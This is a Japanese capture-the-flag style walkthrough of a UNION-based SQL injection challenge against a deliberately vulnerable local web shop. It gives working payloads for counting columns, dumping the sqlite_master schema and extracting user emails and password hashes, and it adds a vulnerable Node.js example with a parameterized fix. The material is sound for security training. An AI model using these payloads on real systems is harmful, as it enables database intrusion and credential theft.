# Database Schema ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** SQLi (UNION攻撃)
**目標:** データベースのテーブル構造を取得する

---

## 背景知識

### UNION攻撃とは

UNION攻撃は SQLインジェクションの発展形で、**本来のクエリ結果に攻撃者が望むデータを追加**する手法。

```
┌─────────────────────────────────────────────────────────────────┐
│                     通常のSQL検索                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ユーザー: "apple" で検索                                        │
│      │                                                          │
│      ▼                                                          │
│  SQL: SELECT * FROM Products WHERE name LIKE '%apple%'          │
│      │                                                          │
│      ▼                                                          │
│  結果: [Apple Juice, Apple Pomace]                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                     UNION攻撃                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻撃者: "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
│      │                                                          │
│      ▼                                                          │
│  SQL: SELECT * FROM Products WHERE ((name LIKE '%'))            │
│       UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--     │
│      │                                                          │
│      ▼                                                          │
│  結果: [Products...] + [CREATE TABLE Users (...)]  ← DB構造が漏洩！
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

図書館で本を検索する場面を想像してください:

- **通常の検索**: 「料理の本を探して」→ 料理本のリストが返る
- **UNION攻撃**: 「料理の本を探して、あとついでに全職員の名簿も」→ 料理本 + 職員名簿

UNION は SQL で「2つの結果を連結する」命令。攻撃者はこれを悪用して、本来見れないデータを「検索結果に混ぜて」取得する。

### なぜ危険？

データベースの構造（スキーマ）が分かると、攻撃者は次のことができる:

1. **テーブル名を知る** → どんなデータがあるか把握
2. **カラム名を知る** → password, credit_card などの機密カラムを特定
3. **次の攻撃を計画** → ユーザー認証情報の窃取など

---

## 思考プロセス

### ステップ1: UNION攻撃の前提条件を確認

```
「UNION攻撃には条件がある」
    ↓
「① カラム数が同じ必要がある」
「② データ型も互換性が必要」
    ↓
「まずカラム数を特定しよう」
```

### ステップ2: カラム数の特定

```
「ORDER BY でカラム数を推測できる」
    ↓
「ORDER BY 1 → 成功」
「ORDER BY 5 → 成功」
「ORDER BY 10 → エラー」
「ORDER BY 9 → 成功」
    ↓
「カラム数は9と判明」
```

### ステップ3: 表示されるカラムを特定

```
「9個のカラムのうち、画面に表示されるのはどれ？」
    ↓
「UNION SELECT 1,2,3,4,5,6,7,8,9 を試す」
    ↓
「画面に 1, 2, 3 が表示された」
    ↓
「1番目のカラムに欲しいデータを入れよう」
```

### ステップ4: データベース情報を取得

```
「SQLiteの場合、sqlite_master にスキーマ情報がある」
    ↓
「sql カラムに CREATE TABLE 文が格納されている」
    ↓
「UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master」
```

---

## 実行手順

### Step 1: 検索機能にアクセス

`http://localhost:3000/#/search` にアクセスし、検索バーを表示。

### Step 2: カラム数を確認（任意）

```sql
-- 9カラムであることを確認（エラーが出なければOK）
test')) ORDER BY 9--
```

### Step 3: UNION攻撃を実行

検索バーに以下を入力:
```sql
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

### Step 4: 結果を確認

検索結果に、通常の商品データに混じって CREATE TABLE 文が表示される:

```sql
CREATE TABLE "Users" (
    "id" INTEGER PRIMARY KEY AUTOINCREMENT,
    "username" VARCHAR(255) DEFAULT '',
    "email" VARCHAR(255) UNIQUE,
    "password" VARCHAR(255),
    "role" VARCHAR(255) DEFAULT 'customer',
    "totpSecret" VARCHAR(255) DEFAULT '',
    "isActive" TINYINT(1) DEFAULT 1,
    ...
)
```

---

## ペイロードの詳細解説

```sql
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

| パート | 役割 | 解説 |
|--------|------|------|
| `'))` | 元のクエリを閉じる | 元の SQL が `WHERE ((name LIKE '%入力値%'))` の形式 |
| `UNION` | 結果を連結 | 2つの SELECT 結果を1つに結合 |
| `SELECT sql,2,3,4,5,6,7,8,9` | 9カラムのダミーデータ | 元のクエリと同じカラム数が必要 |
| `FROM sqlite_master` | システムテーブル参照 | DB構造が格納されたテーブル |
| `--` | コメント化 | 残りの SQL を無効化 |

### 元のクエリと攻撃後の比較

```sql
-- 元のクエリ（推測）
SELECT id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt
FROM Products
WHERE ((name LIKE '%検索文字%') OR (description LIKE '%検索文字%'))
AND deletedAt IS NULL

-- 攻撃後のクエリ
SELECT id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt
FROM Products
WHERE ((name LIKE '%')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
-- ↑ ここ以降はコメント化されて無視される
```

---

## sqlite_master テーブル

SQLite の特殊なシステムテーブルで、データベースの構造情報を格納:

| カラム | 内容 | 例 |
|--------|------|-----|
| type | オブジェクトの種類 | table, index, view |
| name | オブジェクト名 | Users, Products |
| tbl_name | テーブル名 | Users |
| sql | CREATE文 | CREATE TABLE "Users" (...) |

### 他のDBMSでの同等テーブル

| DBMS | システムテーブル |
|------|-----------------|
| SQLite | sqlite_master |
| MySQL | information_schema.tables |
| PostgreSQL | pg_catalog.pg_tables |
| SQL Server | sys.tables |
| Oracle | all_tables |

---

## 取得できる情報

このチャレンジで取得できる主要なテーブル:

```sql
-- Users テーブル（認証情報）
CREATE TABLE "Users" (
    "id" INTEGER PRIMARY KEY,
    "email" VARCHAR(255) UNIQUE,
    "password" VARCHAR(255),     -- ← MD5ハッシュ
    "role" VARCHAR(255),         -- ← admin/customer
    "totpSecret" VARCHAR(255),   -- ← 2FA秘密鍵
    ...
)

-- Feedbacks テーブル
CREATE TABLE "Feedbacks" (
    "id" INTEGER PRIMARY KEY,
    "UserId" INTEGER,
    "comment" VARCHAR(255),
    "rating" INTEGER,
    ...
)

-- Baskets テーブル（カート情報）
CREATE TABLE "Baskets" (...)
```

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード
app.get('/search', (req, res) => {
  const query = req.query.q;
  // 文字列連結でSQLを組み立て
  const sql = `SELECT * FROM Products WHERE name LIKE '%${query}%'`;
  db.all(sql, (err, rows) => {
    res.json(rows);
  });
});
```

### 安全な実装

```javascript
// ✅ 安全なコード（パラメータ化クエリ）
app.get('/search', (req, res) => {
  const query = req.query.q;
  // プレースホルダーを使用
  const sql = 'SELECT * FROM Products WHERE name LIKE ?';
  db.all(sql, [`%${query}%`], (err, rows) => {
    res.json(rows);
  });
});
```

---

## 次のステップ

スキーマが分かったら、次は実際のデータを取得:

```sql
-- ユーザー認証情報を取得
')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--
```

→ [User Credentials](../difficulty-4/user-credentials.md) チャレンジへ

---

## 関連チャレンジ

- [User Credentials](../difficulty-4/user-credentials.md) - 認証情報の取得
- [Login Admin](../difficulty-2/login-admin.md) - 基本的なSQLi
- [Login Jim](login-jim.md) - 特定ユーザーへのSQLi
- [Christmas Special](../difficulty-4/christmas-special.md) - UNION + IDOR

## 参考リンク

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger - UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [SQLite System Tables](https://www.sqlite.org/schematab.html)
